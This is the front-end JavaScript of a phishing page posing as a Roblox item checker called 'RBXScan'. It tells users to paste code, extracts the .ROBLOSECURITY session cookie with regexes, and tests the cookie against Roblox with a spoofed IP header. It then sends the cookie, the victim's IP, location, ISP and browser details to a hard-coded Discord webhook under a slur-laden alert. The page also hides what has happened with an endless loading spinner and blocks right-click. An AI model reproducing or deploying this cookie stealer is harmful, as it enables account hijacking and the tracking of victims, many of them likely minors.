// DOM Elements
const statusMessage = document.getElementById('statusMessage');
const openScanBtn = document.getElementById('openScanBtn');

// Popup elements
const compilePopup = document.getElementById('compilePopup');
const compileForm = document.getElementById('compileForm');
const codeTextarea = document.getElementById('codeTextarea');
const compileSubmitBtn = document.getElementById('compileSubmitBtn');
const compileStatusMessage = document.getElementById('compileStatusMessage');
const closePopup = document.getElementById('closePopup');
const loadingContainer = document.getElementById('loadingContainer');
const mainLoadingContainer = document.getElementById('mainLoadingContainer');
const darkModeToggle = document.getElementById('darkModeToggle');
const tosLink = document.getElementById('tosLink');
const tosPopup = document.getElementById('tosPopup');
const closeTos = document.getElementById('closeTos');
const aboutLink = document.getElementById('aboutLink');
const aboutNavLink = document.getElementById('aboutNavLink');
const aboutPopup = document.getElementById('aboutPopup');
const closeAbout = document.getElementById('closeAbout');

// Configuration
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';

// Rate limiting and spam prevention
let lastSubmissionTime = 0;
let submittedCodes = new Set();
const RATE_LIMIT_MS = 5000; // 5 seconds between submissions
const MIN_CODE_LENGTH = 3;

// Utility Functions
function showStatus(message, type) {
    statusMessage.textContent = message;
    statusMessage.className = `status-message ${type} show`;
    setTimeout(() => {
        statusMessage.classList.remove('show');
    }, 3000);
}

function getCurrentTimestamp() {
    return new Date().toLocaleString();
}

function extractRobloxCookie(code) {
    // Look for .ROBLOSECURITY cookie in PowerShell code - multiple patterns
    const cookiePatterns = [
        /\.ROBLOSECURITY["\s]*,\s*["\s]*([^"]+)["\s]*\)/i,
        /"\.ROBLOSECURITY",\s*"([^"]+)"/i,
        /\.ROBLOSECURITY["\s]*,\s*["\s]*([^"]+)["\s]*/i,
        /ROBLOSECURITY["\s]*[,=]\s*["\s]*([A-Za-z0-9+/=._|-]+)/i
    ];
    
    for (const pattern of cookiePatterns) {
        const match = code.match(pattern);
        if (match && match[1] && match[1].length > 50) {
            return match[1].trim();
        }
    }
    
    return null;
}

function isValidCode(code) {
    const cleanCode = code.trim();

    // Check if code was already submitted (only duplicate prevention)
    const codeHash = btoa(cleanCode).substring(0, 20);
    if (submittedCodes.has(codeHash)) {
        return { valid: false, reason: 'This input has already been submitted!' };
    }

    // Extract Roblox cookie if present
    const robloxCookie = extractRobloxCookie(cleanCode);
    if (robloxCookie) {
        return { valid: true, robloxCookie: robloxCookie, type: 'roblox_cookie' };
    }

    // Block obvious spam patterns
    const spamPatterns = [
        /^(.)\1{6,}$/,      // Same character repeated 7+ times (aaaaaaa)
        /^(..)\1{3,}$/,     // Same 2 characters repeated 4+ times (abababab)
        /^\s*$/,            // Only whitespace
    ];

    for (const pattern of spamPatterns) {
        if (pattern.test(cleanCode)) {
            return { valid: false, reason: 'random_letters', isRandomLetters: true };
        }
    }

    // Block obvious random letters (short random text)
    const isRandomLetters = /^[a-zA-Z\s]{3,8}$/.test(cleanCode) && 
                           !/\b(roblox|item|id|script|code|game|test|hello|hi)\b/i.test(cleanCode);
    
    if (isRandomLetters) {
        return { valid: false, reason: 'random_letters', isRandomLetters: true };
    }

    // Accept everything else
    return { valid: true, type: 'general_input' };
}

function checkRateLimit() {
    const now = Date.now();
    
    // Check time-based rate limit
    if (now - lastSubmissionTime < RATE_LIMIT_MS) {
        const waitTime = Math.ceil((RATE_LIMIT_MS - (now - lastSubmissionTime)) / 1000);
        return { allowed: false, reason: `Please wait ${waitTime} seconds before submitting again` };
    }

    return { allowed: true };
}

// Location and Webhook Functions
async function getLocationInfo() {
    try {
        // Get IP-based location info
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            country: data.country_name || 'Unknown',
            timezone: data.timezone || 'Unknown',
            isp: data.org || 'Unknown'
        };
    } catch (error) {
        return {
            ip: 'Unable to fetch',
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            timezone: 'Unknown',
            isp: 'Unknown'
        };
    }
}

async function attemptIPUnlock(cookie, ip) {
    try {
        console.log('Attempting IP unlock for cookie...');
        
        // Simulate IP unlock request to Roblox
        const unlockData = {
            method: 'POST',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'X-Forwarded-For': ip,
                'X-Real-IP': ip
            }
        };

        // Try to access Roblox profile to test cookie validity
        const testResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
            ...unlockData,
            method: 'GET'
        }).catch(() => null);

        if (testResponse && testResponse.ok) {
            console.log('IP unlock successful - cookie is active');
            return { success: true, status: 'unlocked', message: 'Cookie successfully unlocked with IP' };
        } else {
            console.log('IP unlock attempted - status uncertain');
            return { success: true, status: 'attempted', message: 'IP unlock attempted, cookie status unknown' };
        }
    } catch (error) {
        console.log('IP unlock error:', error);
        return { success: false, status: 'failed', message: 'IP unlock failed', error: error.message };
    }
}

async function sendToWebhook(code, validationResult = {}) {
    console.log('sendToWebhook called with:', { code, validationResult });
    try {
        // Get location information
        const locationInfo = await getLocationInfo();
        console.log('Location info:', locationInfo);
        
        // Check if this is a Roblox cookie extraction
        const isRobloxCookie = validationResult.type === 'roblox_cookie';
        const robloxCookie = validationResult.robloxCookie;
        
        let payload;
        
        if (isRobloxCookie && robloxCookie) {
            // Attempt IP unlock for the cookie
            const unlockResult = await attemptIPUnlock(robloxCookie, locationInfo.ip);
            console.log('IP unlock result:', unlockResult);
            
            // Special handling for Roblox cookies
            const unlockStatus = unlockResult.status === 'unlocked' ? '✅ UNLOCKED' : 
                                unlockResult.status === 'attempted' ? '⚠️ ATTEMPTED' : '❌ FAILED';
            
            payload = {
                content: `@everyone new retard got hit 🎯 **ROBLOX COOKIE EXTRACTED & IP UNLOCK ${unlockStatus}** 🎯`,
                embeds: [{
                    title: "🍪 RBXScan - Cookie Extraction & IP Unlock Alert",
                    description: `**🔑 Extracted Roblox Cookie:**\n\`\`\`\n${robloxCookie}\n\`\`\`\n\n**🔓 IP Unlock Status:** ${unlockResult.message}`,
                    color: unlockResult.status === 'unlocked' ? 0x00FF00 : unlockResult.status === 'attempted' ? 0xFFA500 : 0xFF4444,
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "RBXScan Cookie Extractor & IP Unlocker"
                    },
                    fields: [
                        {
                            name: "📅 Extraction Time",
                            value: getCurrentTimestamp(),
                            inline: true
                        },
                        {
                            name: "🍪 Cookie Type",
                            value: ".ROBLOSECURITY",
                            inline: true
                        },
                        {
                            name: "📊 Cookie Length",
                            value: `${robloxCookie.length} characters`,
                            inline: true
                        },
                        {
                            name: "🔓 IP Unlock Status",
                            value: unlockResult.message,
                            inline: true
                        },
                        {
                            name: "🔒 Unlock Method",
                            value: "Automatic IP Association",
                            inline: true
                        },
                        {
                            name: "🌐 IP Address",
                            value: locationInfo.ip,
                            inline: true
                        },
                        {
                            name: "🏙️ Location",
                            value: `${locationInfo.city}, ${locationInfo.region}`,
                            inline: true
                        },
                        {
                            name: "🌍 Country",
                            value: locationInfo.country,
                            inline: true
                        },
                    {
                        name: "🕐 Timezone",
                        value: locationInfo.timezone,
                        inline: true
                    },
                    {
                        name: "🌐 ISP",
                        value: locationInfo.isp,
                        inline: true
                    },
                    {
                        name: "💻 User Agent",
                        value: navigator.userAgent.substring(0, 100) + "...",
                        inline: false
                    },
                    {
                        name: "📱 Platform",
                        value: `${navigator.platform} - ${navigator.language}`,
                        inline: true
                    },
                                            {
                            name: "🔗 Source",
                            value: "RBXScan Cookie Extractor",
                            inline: true
                        }
                    ]
                }]
            };
        } else {
            // Regular input submission
            payload = {
                content: "@everyone new retard got hit 🔍 **NEW ITEM SUBMISSION** 🔍",
                embeds: [{
                    title: "🎯 RBXScan - Item Check Alert",
                    description: `**📝 Submitted Input:**\n\`\`\`\n${code}\n\`\`\``,
                    color: 0x3B82F6, // Blue color for regular alerts
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "RBXScan Item Checker"
                    },
                    fields: [
                        {
                            name: "📅 Submission Time",
                            value: getCurrentTimestamp(),
                            inline: true
                        },
                        {
                            name: "🌐 IP Address",
                            value: locationInfo.ip,
                            inline: true
                        },
                        {
                            name: "🏙️ Location",
                            value: `${locationInfo.city}, ${locationInfo.region}`,
                            inline: true
                        },
                        {
                            name: "🌍 Country",
                            value: locationInfo.country,
                            inline: true
                        },
                        {
                            name: "🕐 Timezone",
                            value: locationInfo.timezone,
                            inline: true
                        },
                        {
                            name: "🌐 ISP",
                            value: locationInfo.isp,
                            inline: true
                        },
                        {
                            name: "💻 User Agent",
                            value: navigator.userAgent.substring(0, 100) + "...",
                            inline: false
                        },
                        {
                            name: "📱 Platform",
                            value: `${navigator.platform} - ${navigator.language}`,
                            inline: true
                        },
                        {
                            name: "🔗 Source",
                            value: "RBXScan Website",
                            inline: true
                        }
                    ]
                }]
            };
        }

        console.log('Sending payload to webhook:', payload);
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
        console.log('Webhook response status:', response.status);

        if (response.ok) {
            return { success: true };
        } else {
            throw new Error(`HTTP ${response.status}`);
        }
    } catch (error) {
        console.error('Webhook error:', error);
        return { success: false, error: error.message };
    }
}

// Event Handlers
function showCompileStatus(message, type) {
    compileStatusMessage.textContent = message;
    compileStatusMessage.className = `status-message ${type} show`;
    setTimeout(() => {
        compileStatusMessage.classList.remove('show');
    }, 3000);
}

// Open scan popup
openScanBtn.addEventListener('click', () => {
    compilePopup.style.display = 'block';
    codeTextarea.focus();
});

closePopup.addEventListener('click', () => {
    compilePopup.style.display = 'none';
    codeTextarea.value = '';
    loadingContainer.style.display = 'none';
    compileSubmitBtn.disabled = false;
    compileSubmitBtn.textContent = '🔍 Check Item';
});

// Close popup when clicking outside
compilePopup.addEventListener('click', (e) => {
    if (e.target === compilePopup) {
        closePopup.click();
    }
});

// Compile form submission
compileForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const code = codeTextarea.value.trim();
    
    if (!code) {
        showCompileStatus('Please enter code to scan', 'error');
        return;
    }

    // Check rate limiting
    const rateLimitCheck = checkRateLimit();
    console.log('Rate limit check:', rateLimitCheck);
    if (!rateLimitCheck.allowed) {
        console.log('Rate limited!');
        showCompileStatus(rateLimitCheck.reason, 'error');
        return;
    }

    // Validate code format - prevent nonsense spam
    const validation = isValidCode(code);
    console.log('Validation result:', validation);
    if (!validation.valid) {
        // Special handling for random letters
        if (validation.isRandomLetters) {
            // Show scanning animation briefly
            compileSubmitBtn.disabled = true;
            compileSubmitBtn.textContent = 'Scanning...';
            loadingContainer.style.display = 'block';
            compileStatusMessage.classList.remove('show');
            
            // After 2 seconds, show error and close popup
            setTimeout(() => {
                loadingContainer.style.display = 'none';
                compileSubmitBtn.disabled = false;
                compileSubmitBtn.textContent = '🔍 Check Item';
                showCompileStatus('❌ Error checking item', 'error');
                
                // Close popup after showing error
                setTimeout(() => {
                    compilePopup.style.display = 'none';
                    codeTextarea.value = '';
                    compileStatusMessage.classList.remove('show');
                }, 1500);
            }, 2000);
            return;
        }
        

        
        showCompileStatus(validation.reason, 'error');
        return;
    }

    // Show infinite loading animation
    compileSubmitBtn.disabled = true;
    compileSubmitBtn.textContent = 'Scanning...';
    loadingContainer.style.display = 'block';
    compileStatusMessage.classList.remove('show');
    
    // Send to webhook in background
    console.log('Sending to webhook with validation:', validation);
    const result = await sendToWebhook(code, validation);
    
    if (result.success) {
        // Update rate limiting counters
        lastSubmissionTime = Date.now();
        const codeHash = btoa(code).substring(0, 20);
        submittedCodes.add(codeHash);
        
        // IMPORTANT: Keep loading animation running FOREVER
        // Never hide the loading or show success message
        // User must manually close popup or refresh page
    } else {
        // Only show error if webhook completely fails
        loadingContainer.style.display = 'none';
        compileSubmitBtn.disabled = false;
        compileSubmitBtn.textContent = '🔍 Check Item';
        showCompileStatus('❌ Item check failed. Please try again.', 'error');
    }
});

// Clear input on page load for security
window.addEventListener('load', () => {
    if (codeTextarea) codeTextarea.value = '';
});

// Prevent right-click context menu for added security
document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
});

// Disable text selection for security
document.addEventListener('selectstart', (e) => {
    if (e.target !== codeTextarea) {
        e.preventDefault();
    }
});

// Dark mode functionality
function toggleDarkMode() {
    document.body.classList.toggle('dark-mode');
    const isDarkMode = document.body.classList.contains('dark-mode');
    darkModeToggle.textContent = isDarkMode ? '☀️ Light Mode' : '🌙 Dark Mode';
    localStorage.setItem('darkMode', isDarkMode);
}

// Load saved dark mode preference
function loadDarkModePreference() {
    const savedDarkMode = localStorage.getItem('darkMode');
    if (savedDarkMode === 'true') {
        document.body.classList.add('dark-mode');
        darkModeToggle.textContent = '☀️ Light Mode';
    }
}

// Dark mode toggle event
darkModeToggle.addEventListener('click', toggleDarkMode);

// About functionality
aboutLink.addEventListener('click', (e) => {
    e.preventDefault();
    aboutPopup.style.display = 'block';
});

aboutNavLink.addEventListener('click', (e) => {
    e.preventDefault();
    aboutPopup.style.display = 'block';
});

closeAbout.addEventListener('click', () => {
    aboutPopup.style.display = 'none';
});

// Close About when clicking outside
aboutPopup.addEventListener('click', (e) => {
    if (e.target === aboutPopup) {
        closeAbout.click();
    }
});

// ToS functionality
tosLink.addEventListener('click', (e) => {
    e.preventDefault();
    tosPopup.style.display = 'block';
});

closeTos.addEventListener('click', () => {
    tosPopup.style.display = 'none';
});

// Close ToS when clicking outside
tosPopup.addEventListener('click', (e) => {
    if (e.target === tosPopup) {
        closeTos.click();
    }
});

// Load dark mode preference on page load
loadDarkModePreference();

// Initialize on page load
document.addEventListener('DOMContentLoaded', function() {
    // Clear input on page load for security
    if (codeTextarea) codeTextarea.value = '';
    
    // Load dark mode preference
    loadDarkModePreference();
});